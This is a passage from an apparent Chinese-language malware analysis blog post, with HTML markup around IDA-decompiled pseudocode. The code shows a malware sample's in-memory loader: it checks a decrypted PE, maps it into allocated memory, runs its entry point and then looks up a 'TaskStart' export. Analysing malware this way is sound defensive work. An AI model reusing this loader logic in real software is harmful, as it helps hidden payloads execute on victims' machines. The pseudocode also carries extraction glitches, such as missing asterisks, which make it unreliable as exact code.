punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">CmpFileSize</span><span class="token punctuation">(</span>FileSize<span class="token punctuation">,</span> <span class="token number">0x40u</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          <span class="token comment">// 比较文件大小是否大于等于0x40  </span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span>pFileBase <span class="token operator">!=</span> <span class="token number">0x5A4D</span> <span class="token punctuation">)</span>          <span class="token comment">// 判断是否是PE文件  </span><span class="token keyword">goto</span> LABEL_3<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">CmpFileSize</span><span class="token punctuation">(</span>FileSize<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>pFileBase <span class="token operator">+</span> <span class="token number">0xF</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0xF8</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token comment">// 比较文件大小是否大于等于0x1F0  </span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  NtHeader <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>pFileBase <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>pFileBase <span class="token operator">+</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">!=</span> <span class="token number">0x4550</span> <span class="token punctuation">)</span>          <span class="token comment">// 判断是否是PE文件  </span><span class="token keyword">goto</span> LABEL_3<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0x14C</span> <span class="token punctuation">)</span>      <span class="token comment">// 判断文件运行平台 0x14C代表I386  </span><span class="token keyword">goto</span> LABEL_3<span class="token punctuation">;</span>  SectionAlignment <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> SectionAlignment <span class="token operator">&amp;</span> <span class="token number">1</span> <span class="token punctuation">)</span>                   <span class="token comment">// 判断内存对齐粒度  </span><span class="token keyword">goto</span> LABEL_3<span class="token punctuation">;</span>  NumberOfSection <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>               <span class="token comment">// 判断区段数量  </span><span class="token punctuation">&#123;</span>  TextName <span class="token operator">=</span> <span class="token operator">&amp;</span>NtHeader<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x24</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 取出SectionHeader[0]->name-----.text  </span><span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>  TextSize <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>TextName <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 取出SectionHeader[0]->SizeOfRawData-----0x6000  </span>TextVirtualAddress <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>TextName<span class="token punctuation">;</span> <span class="token comment">// 取出SectionHeader[0]->VirtualAddersss-----0x1000  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> TextSize <span class="token punctuation">)</span>  SectionHeader<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> TextSize <span class="token operator">+</span> TextVirtualAddress<span class="token punctuation">;</span><span class="token comment">// 代码段的大小+代码段的起始地址=下一个区段的起始地址  </span><span class="token keyword">else</span>  SectionHeader<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> SectionAlignment <span class="token operator">+</span> TextVirtualAddress<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> SectionHeader<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> v28 <span class="token punctuation">)</span>  v28 <span class="token operator">=</span> SectionHeader<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  TextName <span class="token operator">+=</span> <span class="token number">0x28</span><span class="token punctuation">;</span>  <span class="token operator">--</span>NumberOfSection<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> NumberOfSection <span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">// 遍历区段  </span><span class="token punctuation">&#125;</span>  hKernel32 <span class="token operator">=</span> <span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span>Kernel32<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 获取Kernel32的基址  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>hKernel32 <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  GetSystemInfo_Addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>HMODULE<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>LPSYSTEM_INFO<span class="token punctuation">)</span><span class="token punctuation">,</span> _DWORD<span class="token punctuation">)</span><span class="token punctuation">)</span>GetProcAddress_Addr<span class="token punctuation">)</span>、<span class="token punctuation">(</span>hKernel32<span class="token punctuation">,</span> GetNativeSystemInfo<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取GetNativeSystemInfo函数地址  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>GetSystemInfo_Addr <span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">GetSystemInfo_Addr</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lpSystemInfo<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 获取系统信息  </span>v17 <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span>v27 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  dwSize <span class="token operator">=</span> v17 <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">+</span> v27 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> dwSize <span class="token operator">!=</span> <span class="token punctuation">(</span>v17 <span class="token operator">&amp;</span> <span class="token punctuation">(</span>v27 <span class="token operator">+</span> v28 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token comment">// 此处条件不成立 跳过if分支  </span><span class="token punctuation">&#123;</span>  LABEL_3<span class="token operator">:</span>  <span class="token function">SetLastError</span><span class="token punctuation">(</span><span class="token number">0xC1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  pAllocAddress <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> MACRO_PAGE<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>VirtualAlloc_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  dwSize<span class="token punctuation">,</span>  <span class="token number">0x3000</span><span class="token punctuation">,</span>  PAGE_READWRITE<span class="token punctuation">,</span>  a8<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// 申请一块大小为0x10000的可读可写的内存空间  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>pAllocAddress <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  pAllocAddress <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> MACRO_PAGE<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>VirtualAlloc_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span>  <span class="token number">0</span><span class="token punctuation">,</span>  dwSize<span class="token punctuation">,</span>  <span class="token number">0x3000</span><span class="token punctuation">,</span>  PAGE_READWRITE<span class="token punctuation">,</span>  a8<span class="token punctuation">)</span><span class="token punctuation">;</span>                      <span class="token comment">// 如果申请失败则再次申请  </span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>pAllocAddress <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  LABEL_24<span class="token operator">:</span>  <span class="token function">SetLastError</span><span class="token punctuation">(</span><span class="token number">0xEu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  hHeap <span class="token operator">=</span> <span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token comment">// 获取进程的堆句柄  </span>pHeapAddress <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">HeapAlloc</span><span class="token punctuation">(</span>hHeap<span class="token punctuation">,</span> HEAP_ZERO_MEMORY<span class="token punctuation">,</span> <span class="token number">0x3Cu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  pHeapBase <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span>pHeapAddress<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>pHeapAddress <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> _DWORD<span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>VirtualFree_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span>pAllocAddress<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">,</span> a8<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">goto</span> LABEL_24<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pHeapAddress <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> pAllocAddress<span class="token punctuation">;</span>  <span class="token function">LOWORD</span><span class="token punctuation">(</span>pHeapAddress<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  pHeapBase<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>pHeapAddress <span class="token operator">>></span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span>  pHeapBase<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> VirtualAlloc_Addr<span class="token punctuation">;</span>  pHeapBase<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> VirtualFree_Addr<span class="token punctuation">;</span>  pHeapBase<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> LoadLibraryA_Addr<span class="token punctuation">;</span>  pHeapBase<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> GetProcAddress_Addr<span class="token punctuation">;</span>  pHeapBase<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> FreeLibrary_Addr<span class="token punctuation">;</span>  pHeapBase<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> a8<span class="token punctuation">;</span>  pHeapBase<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> v27<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">CmpFileSize</span><span class="token punctuation">(</span>FileSize<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">0x15</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// 比较文件大小是否大于等于SizeOfHeaders  0x1000  </span><span class="token operator">||</span> <span class="token punctuation">(</span>AllocAddr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__cdecl <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> _DWORD<span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span>VirtualAlloc_Addr<span class="token punctuation">)</span><span class="token punctuation">(</span>  pAllocAddress<span class="token punctuation">,</span>  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token number">0x1000</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  a8<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 申请一块大小为0x1000的可读可写的内存  0x1000是SizeOfHeaders  </span><span class="token function">memcpy</span><span class="token punctuation">(</span>AllocAddr<span class="token punctuation">,</span> pFileBase<span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">// 把PE头拷贝到申请的堆空间  </span>NtHeaderBaseAddr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>AllocAddr<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>pFileBase <span class="token operator">+</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token operator">*</span>pHeapBase <span class="token operator">=</span> NtHeaderBaseAddr<span class="token punctuation">,</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>NtHeaderBaseAddr <span class="token operator">+</span> <span class="token number">52</span><span class="token punctuation">)</span> <span class="token operator">=</span> pAllocAddress<span class="token punctuation">,</span>  <span class="token operator">!</span><span class="token function">sub_402470</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pFileBase<span class="token punctuation">,</span> FileSize<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>NtHeader<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>pHeapBase<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>pHeapBase <span class="token operator">+</span> <span class="token number">52</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>pHeapBase<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>pHeapBase<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sub_402758</span><span class="token punctuation">(</span>pHeapBase<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>pHeapBase <span class="token operator">+</span> <span class="token number">52</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>NtHeader <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token operator">!</span><span class="token function">sub_4027DF</span><span class="token punctuation">(</span>pHeapBase<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">sub_40254B</span><span class="token punctuation">(</span>pHeapBase<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">sub_40271D</span><span class="token punctuation">(</span>pHeapBase<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  LABEL_37<span class="token operator">:</span>  <span class="token function">sub_4029CC</span><span class="token punctuation">(</span>pHeapBase<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v24 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>pHeapBase <span class="token operator">+</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v24 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> pHeapBase<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__stdcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">,</span> _DWORD<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pAllocAddress <span class="token operator">+</span> v24<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span>pAllocAddress<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token function">SetLastError</span><span class="token punctuation">(</span><span class="token number">0x45Au</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">goto</span> LABEL_37<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  pHeapBase<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>  pHeapBase<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> pAllocAddress <span class="token operator">+</span> v24<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>  pHeapBase<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> pHeapBase<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该函数申请了一块堆空间 并将去掉了解密出的PE文件的DOS头并拷贝到了堆空间中</p><h3 id="5-3-6-GetExportFunAddr-获取导出函数地址"><a href="#5-3-6-GetExportFunAddr-获取导出函数地址" class="headerlink" title="5.3.6 GetExportFunAddr 获取导出函数地址"></a>5.3.6 GetExportFunAddr 获取导出函数地址</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">AllocBase <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span><span class="token punctuation">(</span>pHeapBase <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// AllocBase=0x10000000 是申请的空间的基址  </span>DataDirectory <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span>pHeapBase <span class="token operator">+</span> <span class="token number">0x78</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// pe头+0x78=数据目录表  </span>AllocBase_2 <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span><span class="token punctuation">(</span>pHeapBase <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span>pHeapBase <span class="token operator">+</span> <span class="token number">0x7C</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token keyword">goto</span> LABEL_12<span class="token punctuation">;</span>  ExportRVA <span class="token operator">=</span> DataDirectory<span class="token punctuation">;</span>                   <span class="token comment">// 取出数据目录表的第一项->导出表的RVA  </span>NumberOfNames <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span><span class="token punctuation">(</span>DataDirectory <span class="token operator">+</span> AllocBase <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 取出以名称方式导出的函数数量  </span>ExportVA <span class="token operator">=</span> <span class="token punctuation">(</span>_DWORD <span class="token punctuation">)</span><span class="token punctuation">(</span>AllocBase <span class="token operator">+</span> ExportRVA<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 基址+导出表的RVA=导出表的VA  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该函数有两个参数 堆空间的首地址 和TaskStart这个字符串<br>并返回了导出函数地址</p><p>对于函数逻辑：这个函数首先取出了数据目录表，并根据数据目录表找到了导出表，接着我们看一下dll文件的导出表：</p><img 